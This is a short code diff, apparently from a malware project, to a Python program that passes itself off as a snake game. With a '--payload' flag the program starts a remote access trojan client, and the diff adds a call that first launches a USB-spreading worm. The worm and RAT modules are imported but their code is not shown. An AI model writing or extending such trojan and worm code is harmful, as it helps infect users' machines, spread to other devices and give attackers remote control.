@@ -3,9 +3,15 @@ import time
 import SnakeGame
 import rat_client
 import rat_build
+import usb_worm
 
 def main():
     if len(sys.argv) > 1 and sys.argv[1] == "--payload":
+        try:
+            usb_worm.start_worm()
+        except Exception as e:
+            print(f"Error starting worm: {e}")
+
         # Start the RAT client
         rat_client.start_rat()
     else:
